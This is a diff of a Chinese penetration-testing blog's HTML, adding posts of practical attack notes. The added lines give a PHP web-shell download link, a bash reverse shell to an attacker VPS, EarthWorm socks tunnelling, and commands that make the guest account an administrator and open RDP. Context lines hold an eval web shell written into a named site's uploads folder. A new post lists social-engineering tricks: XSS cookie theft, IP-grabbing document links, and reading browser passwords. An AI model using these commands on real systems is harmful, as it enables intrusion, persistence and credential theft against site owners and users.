@@ -229,7 +229,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shentoux.github.io/2022/11/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/">
+    <link itemprop="mainEntityOfPage" href="https://shentoux.github.io/2022/11/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -248,7 +248,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2022/11/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/" itemprop="url">渗透测试之实战经验</a></h1>
+                <a class="post-title-link" href="/2022/11/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/" itemprop="url">渗透测试之实战经验</a></h1>
         
 
         <div class="post-meta">
@@ -260,8 +260,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-11-13T14:05:02+08:00">
-                2022-11-13
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-11-14T09:46:52+08:00">
+                2022-11-14
               </time>
             
 
@@ -300,7 +300,26 @@
       
         
           
-            <h2 id="渗透测试之实战经验"><a href="#渗透测试之实战经验" class="headerlink" title="渗透测试之实战经验"></a>渗透测试之实战经验</h2><h5 id="一些思路"><a href="#一些思路" class="headerlink" title="一些思路"></a>一些思路</h5><p>目前可进入目标网站后台和后续的渗透思路有以下一些：<br>1、修改后台登录入口嗅探登录的用户和密码；<br>2、通过加密算法生成密文字典进行撞库攻击；<br>3、通过加密算法生成密文后进入数据库修改；<br>4、XSS打Cookie或Flash水坑钓鱼等攻击方式；<br>5、APK中注入恶意程序，替换APK的下载地址；  </p>
+            <h2 id="渗透测试之实战经验"><a href="#渗透测试之实战经验" class="headerlink" title="渗透测试之实战经验"></a>渗透测试之实战经验</h2><h5 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h5><h6 id="base64解码文件"><a href="#base64解码文件" class="headerlink" title="base64解码文件"></a>base64解码文件</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> -d 1.txt &gt;www.zip <span class="comment">##base64解码</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="php大马"><a href="#php大马" class="headerlink" title="php大马"></a>php大马</h5><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Kevil-hui/BestShell/master/best_php_shell.php">https://raw.githubusercontent.com/Kevil-hui/BestShell/master/best_php_shell.php</a></p>
+<h5 id="控制之后"><a href="#控制之后" class="headerlink" title="控制之后"></a>控制之后</h5><h6 id="反弹"><a href="#反弹" class="headerlink" title="反弹"></a>反弹</h6><p>Linux反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/vps的ip/4444 0&gt;&amp;1 <span class="comment">##反弹shell</span></span><br></pre></td></tr></table></figure>
+
+<p>代理做跳板：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew <span class="literal">-s</span> rssocks <span class="literal">-d</span> vps的ip <span class="literal">-e</span> <span class="number">8888</span> <span class="comment">##被控制的主机</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew: ./ew -s rcsocks -l 1080 -e 8888 <span class="comment">##公网vps/控制机</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h6 id="guest开启3389"><a href="#guest开启3389" class="headerlink" title="guest开启3389"></a>guest开启3389</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user  guest  /active:yes                      <span class="comment">#激活guest用户</span></span><br><span class="line">net localgroup  administrators  guest  /add       <span class="comment">#将guest用户添加到administrators</span></span><br><span class="line">net user guest    密码                            <span class="comment">#更改guest用户密码</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f   <span class="comment">#开启3389端口</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="一些思路"><a href="#一些思路" class="headerlink" title="一些思路"></a>一些思路</h5><p>目前可进入目标网站后台和后续的渗透思路有以下一些：<br>1、修改后台登录入口嗅探登录的用户和密码；<br>2、通过加密算法生成密文字典进行撞库攻击；<br>3、通过加密算法生成密文后进入数据库修改；<br>4、XSS打Cookie或Flash水坑钓鱼等攻击方式；<br>5、APK中注入恶意程序，替换APK的下载地址；  </p>
 <h5 id="数据库的一些操作"><a href="#数据库的一些操作" class="headerlink" title="数据库的一些操作"></a>数据库的一些操作</h5><p>1、查询管理员用户：  </p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `cmf_users` WHERE `user_login`=<span class="string">&#x27;B8V9nAV&#x27;</span>;</span><br></pre></td></tr></table></figure>
 <p>2、查询多少用户在用这个密码：</p>
@@ -330,6 +349,142 @@
 <h6 id="命令执行echo写码"><a href="#命令执行echo写码" class="headerlink" title="命令执行echo写码"></a>命令执行echo写码</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$echo</span> <span class="string">&#x27;&lt;? php @eval($_POST[&quot;x&quot;]); ?&gt;&#x27;</span> &gt;/www/wwwroot/mzysqcq.cn/uploads/20200701/shell.php</span><br></pre></td></tr></table></figure>
 <p>###一些常用的技巧</p>
 <h4 id="csv文件合并"><a href="#csv文件合并" class="headerlink" title="csv文件合并"></a>csv文件合并</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$find</span> /path/to/directory/ -name *.csv -print0 | xargs -0 -I file <span class="built_in">cat</span> file &gt; merged.file</span><br><span class="line"><span class="variable">$find</span> /path/to/directory/ -name *.csv -<span class="built_in">exec</span> <span class="built_in">cat</span> &#123;&#125; + &gt; merged.file</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shentoux.github.io/2022/11/14/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试经验及技巧">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/11/14/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/" itemprop="url">Untitled</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-11-14T09:33:55+08:00">
+                2022-11-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="社会工程学攻击总结"><a href="#社会工程学攻击总结" class="headerlink" title="社会工程学攻击总结"></a>社会工程学攻击总结</h2><ol>
+<li><p>是否有客服？聊天交互引导点击，制作xss钓鱼点击获取后台cookie，发送木马等，ddos攻击威胁等…</p>
+</li>
+<li><p>将图片网页链接放进word、excle文档中，让对方点击获取ip</p>
+</li>
+<li><p>通过攻击嫌疑人网站引导嫌疑人攻击自己的蜜罐，通过向嫌疑人网站写入日志内容的方式不断攻击嫌疑人的网站，激怒对方，自己的链接可放上社交聊天的小号。</p>
+<p>比如添加 Referer: <a target="_blank" rel="noopener" href="http://chsi-com.org.cn/">http://chsi-com.org.cn/</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/stcs3475/img/1647307767.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/stcs3475/img/1647308059(1).png"></p>
+<p>查看日志：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/stcs3475/img/1647308207(1).png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/stcs3475/img/1647309331(1).png"></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.iculture.cc/knowledge/pig=10727">通过蜜罐技术获取攻击者的手机号、微信号</a>   修改代码后可读取电脑上其他文件，比如chrome保存的密码和浏览历史，qq等文件</p>
+</li>
+<li></li>
+</ol>
+
           
         
       
@@ -871,7 +1026,7 @@
               
                 <a href="/archives/%20%7C%7C%20archive">
               
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
